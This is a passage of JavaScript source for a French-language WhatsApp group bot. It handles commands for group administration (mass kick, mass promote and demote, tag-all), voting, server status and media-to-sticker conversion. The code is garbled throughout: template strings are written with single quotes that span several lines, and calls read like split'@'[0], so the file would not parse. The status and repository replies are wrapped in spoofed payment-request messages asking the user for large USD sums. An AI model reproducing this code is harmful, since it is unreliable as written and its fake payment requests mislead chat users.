                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Kev.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                replygckev(mess.done)
                break
            case 'mod_nomgroupe':
            case 'mod_sujetgroupe':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                if (!text) return replygckev('Text ?')
                await Kev.groupUpdateSubject(m.chat, text)
                replygckev(mess.done)
                break
                case 'id_utilisateur':{
          	if(!KevTheCreator) return KevStickOwner()
        const groupMetadata = m.isGroup ? await Kev.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = 'Voici l.id de touts les membres du groupe _\n *- ${groupMetadata.subject}*\n\n'
    for (let mem of participants) {
            textt += '${themeemoji} ${mem.id}\n'
        }
      replygckev(textt)
    }
    break
    case 'creer_groupe': case 'creategroup': {
if (!KevTheCreator) return KevStickOwner()
if (!args.join(" ")) return replygckev('Usage ${prefix+command} nom du groupe')
try {
let cret = await Kev.groupCreate(args.join(" "), [])
let response = await Kev.groupInviteCode(cret.id)
const teksop = '     「 Creation Du Groupe 」

▸ Nom : ${cret.subject}
▸ Proprio : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}'
Kev.sendMessage(m.chat, { text:teksop, mentions: await Kev.parseMention(teksop)}, {quoted:m})
} catch {
	replygckev('Erreur')
	}
}
break
    case 'mod_biobot':{
if (!KevTheCreator) return KevStickOwner()
if (!text) return replygckev('Veuillez entrer un texte\nExemple: ${prefix + command} Sylvers Bot ou encore Kenv est trop beau')
    await Kev.updateProfileStatus(text)
    replygckev('bio du bot modifiee en {text}')
    }
    break
    case 'supp_ppgroupe': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return KevStickGroup()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
if (!isBotAdmins) return KevStickBotAdmin()
    await Kev.removeProfilePicture(from)
    }
    break
    case 'supp_ppbot': case 'delppbot': {
if (!KevTheCreator) return KevStickOwner()
    await Kev.removeProfilePicture(Kev.user.id)
    replygckev('pp du bot supprimee')
    }
    break
            case 'mod_description':
            case 'setdesk':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                if (!text) return replygckev('Text ?')
                await Kev.groupUpdateDescription(m.chat, text)
                replygckev(mess.done)
                break
            case 'mod_ppgroupe':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins) return replygckev(mess.admin)
                if (!isBotAdmins) return KevStickBotAdmin()
                if (!quoted) return replygckev('Veuillez repondre a une image ${prefix + command}')
                if (!/image/.test(mime)) return replygckev('Veuillez repondre a une image ${prefix + command}')
                if (/webp/.test(mime)) return replygckev('Veuillez repondre a une image ${prefix + command}')
                var medis = await Kev.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Kev.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                } else {
                    var memeg = await Kev.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                }
                break
            case 'chers_tous':
            case 'hey':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                let me = m.sender
                let teks = '╚»˙·٠${themeemoji}●♥ chers tous ♥●${themeemoji}٠·˙«╝\n😶 *Tag de :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n'
                for (let mem of participants) {
                teks += '${themeemoji} @${mem.id.split('@')[0]}\n'
                }
                Kev.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'tous_dehors': {
 if (!m.isGroup) return KevStickGroup()
 if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
 if (!isBotAdmins) return KevStickBotAdmin()
  const kevkickall = (args[0] === 'numBut')
  ? text.replace('${args[0]} ', '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== '${ownernumber}@s.whatsapp.net')
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== '${ownernumber}@s.whatsapp.net')
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of kevkickall) {
 await Kev.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? '${remove}@s.whatsapp.net' : remove], "remove");
 await sleep(100);
 }
 replygckev('Succes');
}
break
case 'nominations': {
 if (!m.isGroup) return KevStickGroup()
 if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
 if (!isBotAdmins) return KevStickBotAdmin()
  const kevpromoteall = (args[0] === 'numBut')
  ? text.replace('${args[0]} ', '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== '${ownernumber}@s.whatsapp.net')
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== '${ownernumber}@s.whatsapp.net')
      .map(item => item.id);
 for (let promote of kevpromoteall) {
 await Kev.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? '${promote}@s.whatsapp.net' : promote], "promote");
 await sleep(100);
 }
 replygckev('Succes');
}
break
case 'denominations': {
 if (!m.isGroup) return KevStickGroup()
 if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
 if (!isBotAdmins) return KevStickBotAdmin()
  const kevdemoteall = (args[0] === 'numBut')
  ? text.replace('${args[0]} ', '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== '${ownernumber}@s.whatsapp.net')
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== '${ownernumber}@s.whatsapp.net')
      .map(item => item.id);
 for (let demote of kevdemoteall) {
 await Kev.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? '${demote}@s.whatsapp.net' : demote], "demote");
 await sleep(100);
 }
 replygckev('Succes');
}
break
            case 'ecoutez':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                Kev.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'to_tag':
                if (!m.isGroup) return KevStickGroup()
                if (!isBotAdmins) return KevStickBotAdmin()
                if (!isAdmins) return replygckev(mess.admin)
                if (!m.quoted) return replygckev('Veuillez repondre a un media ${prefix + command}')
                Kev.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'groupe':
            case 'grup':{
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                if (args[0] === 'fermer') {
                    await Kev.groupSettingUpdate(m.chat, 'announcement').then((res) => replygckev('fermeture reussie'))
                } else if (args[0] === 'ouvrir') {
                    await Kev.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygckev('Ouverture reussie'))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  OUVRIR/FERMER",
"rows":[{"header":"OUVRIR ✅",
"title":"SELECTION ",
"description":"OUVRIR ✅",
"id":"${prefix+command} ouvrir"},
{"header":"FERMER ❌",
"title":"SELECTION ",
"description":"FERMER ❌",
"id":"${prefix+command} fermer"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                }
            break
            case 'editer_info':{
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                if (args[0] === 'ouvrir') {
                    await Kev.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygckev('tout le monde peut desormais modifier les infos du groupe'))
                } else if (args[0] === 'fermer') {
                    await Kev.groupSettingUpdate(m.chat, 'locked').then((res) => replygckev('les infos du groupe sont desormais restreintes qu.aux admins'))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  OUVRIR/FERMER",
"rows":[{"header":"OUVRIR ✅",
"title":"SELECTION ",
"description":"OUVRIR ✅",
"id":"${prefix+command} ouvrir"},
{"header":"FERMER ❌",
"title":"SELECTION ",
"description":"FERMER ❌",
"id":"${prefix+command} fermer"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
            case 'lien_groupe':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                let response = await Kev.groupInviteCode(m.chat)
                Kev.sendText(m.chat, '👥 *GROUP LINK*\n📛 *Nom :* ${groupMetadata.subject}\n👤 *Proprio du groupe :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split'@'[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *lien de discussion :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n', m, {
                    detectLink: true
                })
            break
            case 'voir_bio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Kev.fetchStatus(who)
    replygckev(bio.status)
  } catch {
    if (text) return replygckev('bio privee ou alors vous n.avez pas repondu au message de la personne concernee !')
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Kev.fetchStatus(who)
      replygckev(bio.status)
    } catch {
      return replygckev('bio privee ou vous n.avez pas r�pondu au message de la personne concernee!')
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return KevStickGroup()
            if (m.chat in vote) return replygckev('_vote encours dans cette disscussion!_\n\n*${prefix}supp_vote* - pour supprimer les votes')
            if (!text) return replygckev('Veuillez entrer l.objet du Vote, Exemple: *${prefix + command} Comment Kenv Fait-il pour etre autant cool?*')
            replygckev('debut su vote!\n\n*${prefix}up_vote* - pour upvote\n*${prefix}down_vote* - pour downvote\n*${prefix}check-vote* - pour verifierle vote\n*${prefix}supp_vote* - pour supprimer le vote')
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = '* VOTE *

*Raison:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Veuillez entrer les commandes suivantes 
*${prefix}up_vote* - pour cast vote
*${prefix}down_vote* -  pour downvote
*${prefix}supp_vote* - pour supprimer vote'
            Kev.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'up_vote': {
            if (!m.isGroup) return KevStickGroup()
            if (!(m.chat in vote)) return replygckev('_*pas de vote encours dans cette discussion !*_\n\n*${prefix}vote* - pour commencer le vote')
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygckev('Vou avez votey')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = '* VOTE *

*Raison:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => '├ ${i + 1}. @${v.split'@'[0]}').join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => '├ ${i + 1}. @${v.split'@'[0]}').join('\n')}
│ 
└────

Veuillez entrer les commandes suivantes 
*${prefix}up_vote* - pour cast vote
*${prefix}down_vote* -  pour downvote
*${prefix}supp_vote* - pour supprimer vote'
            Kev.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'down_vote': {
            if (!m.isGroup) return KevStickGroup()
            if (!(m.chat in vote)) return replygckev('_*pas de vote encours dans cette discussion !*_\n\n*${prefix}vote* - pour commencer le vote')
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygckev('Vous avey votey')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = '* VOTE *

*Raison :* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => '├ ${i + 1}. @${v.split'@'[0]}').join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => '├ ${i + 1}. @${v.split'@'[0]}').join('\n')}
│ 
└────

Veuillez entrer les commandes suivantes 
*${prefix}up_vote* - pour cast vote
*${prefix}down_vote* -  pour downvote
*${prefix}supp_vote* - pour supprimer vote'
            Kev.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return KevStickGroup()
if (!(m.chat in vote)) return replygckev('_*pas de vote encours dans cette discussion !*_\n\n*${prefix}vote* - pour commencer le vote')
teks_vote = '* VOTE *

*Raison :* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => '├ ${i + 1}. @${v.split'@'[0]}').join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => '├ ${i + 1}. @${v.split'@'[0]}').join('\n')}
│ 
└────

*${prefix}supp_vote* - pour supprimer le vote 


©${Kev.user.id}
'
Kev.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'supp_vote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return KevStickGroup()
            if (!(m.chat in vote)) return replygckev('_*pas de vot encours dans cette discussion !*_\n\n*${prefix}vote* - pour commencer le vote')
            delete vote[m.chat]
            replygckenv('Vote supprimey dans cette discussion')
	    }
            break
break
            case 'reinitialiser':
            case 'reinitialiser_lien':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                await Kev.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygckev('reinitialisation reussie')
                    })
            break
                //bot status
            case 'ping': case 'statut_bot': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = '
Rapidit� de reaction ${latensi.toFixed(4)} _Seconde_ \n ${oldd - neww} _milisecondes_\n\nEn ligne depuis : ${runtime(process.uptime())}

💻 Info Du Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_Memoir NodeJS Utilisee _
${Object.keys(used).map((key, _, arr) => '${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}').join('\n')}

${cpus[0] ? '_Total CPU Utilisey_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => '- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%').join('\n')}
_CPU Core(s) Utilisey (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => '${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => '- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%').join('\n')}').join('\n\n')}' : ''}
                '.trim()
	Kev.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: m })
    }
	
	break
	case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get('https://api.github.com/repos/${username}/${repoName}')
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = '
${themeemoji} Nom Du Repository: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Proprio: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 '.trim()
      await Kev.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: m })
    } else {
      await replygckev('impossible de rafraichir les informations du repository')
    }
  } catch (error) {
    console.error(error)
    await replygckev('Repository introuvable ')
  }
}
break
            case 'devenir_boss':
            case 'premiumuser': {
                let teks = 'Hey ${pushname}👋\nVoulez vous acheter le statut de boss? Veuillez contacter le proprio 😉'
                await Kev.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'rentbot':
                replygckev('Veuillez entrer ${prefix}proprio en ecrivevez lui')
                break
            case 'teste_rapiditey': {
                replygckev('chargement...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python sylvers.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) Kev.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) Kev.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'temps_actif':
                let pinga = 'Le bot est actif depuis ${runtime(process.uptime())}'
                Kev.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case 'sc': case 'script': case 'donner': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'code_source': {
let me = m.sender
let teks = '*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHey @${me.split('@')[0]} 👋\n.oublier pas de faire un don 🍜 👇 +237656774511
sendKevMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Kenv/theme/sylvers.jpg"),
"mediaUrl": '${wagc}',
"sourceUrl": '${wagc}'
}
}
})
}
break
            case 'proprio': {
                Kev.sendMessage(from, {
                    contacts: {
                        displayName: '${list.length} Contact',
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
            }
            break
            //convertir
case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygckev('Veuillez repondre a une image/gif/video ${prefix+command}\nDuree de la video comprise entre 1-9 Secondes')
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kev.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygckev('Veuillez repondre a une image/gif/video ${prefix+command}\nDuree de la video comprise entre 1-9 Secondes')
let media = await quoted.download()
let encmedia = await Kev.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygckev('Veuillez repondre a une image/gif/video ${prefix+command}\nDuree de la video comprise entre 1-9 Secondes')
}
}
break
            case 'voler': case 'prendre': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygckev('Veuillez entrer le texte')
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Kev.downloadAndSaveMediaMessage(quoted, "gifee")
Kev.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kev.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygckev('Maximum 10 Secondes!')
let media = await quoted.download()
let encmedia = await Kev.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygckev('Photo/Video?')
}
}
break
            case 'en_image':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygckev('Veuillez repondre a un sticker *${prefix + command}*')
                await KevStickWait()
                let media = await Kev.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec('ffmpeg -i ${media} ${ran}', (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    Kev.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'en_mp4':
            case 'en_video': {
                if (!/webp/.test(mime)) return replygckev('Veuillez repondre a un sticker animey *${prefix + command}*')
                await KevStickWait()
                let media = await Kev.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Kev.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'en_aud':
            case 'en_audio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygckev('Veuillez repondre a une video ${prefix + command}')
                await KevStickWait()
                let media = await Kev.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Kev.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'en_mp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygckev('Veuillez repondre a une video/audio que vous souhaitez convertir en mp3 ${prefix + command}')
                await KevStickWait()
                let media = await Kev.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Kev.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: 'kenvofc.mp3'
                }, {
                    quoted: m
                })

            }
            break
            case 'en_voice':
            case 'en_ptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygckev('Veuillez repondre a une video/audio que vous souhaitez convertir en note vocale ${prefix + command}')
                await KevStickWait()
                let media = await Kev.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./bibliotheque/convertir')
                let audio = await toPTT(media, 'mp4')
                Kev.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'en_gif': {
                if (!/webp/.test(mime)) return replygckev('Veuillez repondre a un sticker *${prefix + command}*')
                await KevStickWait()
                let media = await Kev.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Kev.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'en_url': {
                await KevStickWait()
                let media = await Kev.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygckev(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygckev(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split'+'
                if (!emoji1) return replygckev('Exemple : ${prefix + command} 😅+🤔')
                if (!emoji2) return replygckev('Exemple : ${prefix + command} 😅+🤔')
                await KevStickWait()
